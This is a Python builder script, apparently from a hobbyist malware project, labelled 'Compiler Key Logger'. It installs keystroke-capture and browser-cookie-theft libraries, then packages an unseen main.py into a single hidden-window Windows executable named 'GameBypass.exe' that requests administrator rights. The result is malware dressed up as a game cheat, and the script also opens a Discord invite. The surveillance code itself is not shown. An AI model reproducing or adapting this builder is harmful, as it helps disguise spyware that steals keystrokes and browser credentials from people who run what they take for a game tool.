import os
import sys
import subprocess
import shutil
import threading
import time
from importlib.metadata import version, PackageNotFoundError

def install_dependencies():
    requirements = [
        'pyinstaller',
        'requests',
        'pynput',
        'psutil',
        'pywin32',
        'wmi',
        'pycryptodome',
        'browser-cookie3'
    ]
    
    all_installed = True
    for req in requirements:
        try:
            version(req)
        except PackageNotFoundError:
            all_installed = False
            break
    
    if all_installed:
        return True
        
    print("Verificando e instalando dependencias necesarias...")
    for req in requirements:
        try:
            version(req)
            print(f"✅ {req} ya instalado")
        except PackageNotFoundError:
            try:
                subprocess.run(
                    [sys.executable, "-m", "pip", "install", "-q", req],
                    check=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                print(f"✅ {req} instalado")
            except:
                print(f"❌ Error instalando {req}")
                return False
    return True

def progress_bar(progress, total, prefix=''):
    size = 40
    x = int(size * progress / total)
    print(f'\r{prefix}[{"█" * x}{"." * (size-x)}] {progress}/{total}', end='', flush=True)

def verify_files():
    current_dir = os.path.dirname(os.path.abspath(__file__))
    icon_path = os.path.join(current_dir, "icon.ico")
    main_path = os.path.join(current_dir, "main.py")
    
    if not os.path.exists(main_path):
        print("❌ Error: No se encuentra el archivo main.py")
        return False
        
    if not os.path.exists(icon_path):
        print("❌ Error: No se encuentra el archivo icon.ico")
        return False
        
    if not os.path.getsize(icon_path):
        print("❌ Error: El archivo icon.ico está vacío o corrupto")
        return False
    
    return True

def open_discord():
    invite_link = "https://discord.gg/tfRuSC52Da"
    try:
        os.system(f'start {invite_link}')
    except:
        pass

def show_banner():
    banner = f"""\033[38;5;205m
████████╗██╗  ██╗ ██████╗      ██╗  ██╗    ██╗  ██╗██╗  ██╗██╗  ██╗
╚══██╔══╝██║  ██║██╔═══██╗     ╚██╗██╔╝    ██║  ██║██║  ██║╚██╗██╔╝
   ██║   ███████║██║   ██║      ╚███╔╝     ███████║███████║ ╚███╔╝ 
   ██║   ██╔══██║██║   ██║      ██╔██╗     ██╔══██║╚════██║ ██╔██╗ 
   ██║   ██║  ██║╚██████╔╝     ██╔╝ ██╗    ██║  ██║     ██║██╔╝ ██╗
   ╚═╝   ╚═╝  ╚═╝ ╚═════╝      ╚═╝  ╚═╝    ╚═╝  ╚═╝     ╚═╝╚═╝  ╚═╝
                                                                  
═══════════════════════════════════════════════════════
║               [Compiler Key Logger]                  ║
║               Created by: THO X H4X                  ║
╚══════════════════════════════════════════════════════╝
\033[0m"""
    print(banner)

def compile_program():
    current_dir = os.path.dirname(os.path.abspath(__file__))
    icon_path = os.path.join(current_dir, "icon.ico")
    dist_path = os.path.join(current_dir, 'dist')
    exe_path = os.path.join(dist_path, 'GameBypass.exe')
    
    try:
        print("\nCompilando programa...")
        cmd = [
            'pyinstaller',
            '--noconfirm',
            '--onefile',
            '--windowed',
            '--clean',
            '--name=GameBypass',
            '--icon=' + icon_path,
            f'--distpath={dist_path}',
            f'--workpath={current_dir}\\build',
            '--runtime-tmpdir=.',  
            '--uac-admin',  
            '--exclude-module=_debug_utils',
            '--exclude-module=pytest',
            '--exclude-module=unittest',
            'main.py'
        ]
        
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        for i in range(101):
            progress_bar(i, 100, "Progreso: ")
            time.sleep(0.1)
            if i == 95 and process.poll() is None:
                i = 94
                
        process.wait()
        print("\n")
        
        if os.path.exists("build"): shutil.rmtree("build")
        if os.path.exists("GameBypass.spec"): os.remove("GameBypass.spec")
            
        print("\n✅ Compilación exitosa!")
        print(f"📁 Archivo generado en: {exe_path}")
        os.startfile(dist_path)
        return True
        
    except Exception as e:
        print(f"\n❌ Error durante la compilación: {e}")
        return False

if __name__ == "__main__":
    if not install_dependencies():
        print("❌ Error instalando dependencias. Por favor, inténtelo de nuevo.")
        sys.exit(1)
        
    if not verify_files():
        print("❌ Error: Archivos necesarios no encontrados.")
        sys.exit(1)
    
    os.system('cls' if os.name == 'nt' else 'clear')
    
    show_banner()
    print("🔨 Iniciando proceso de compilación...\n")
    threading.Thread(target=open_discord, daemon=True).start()
    compile_program()
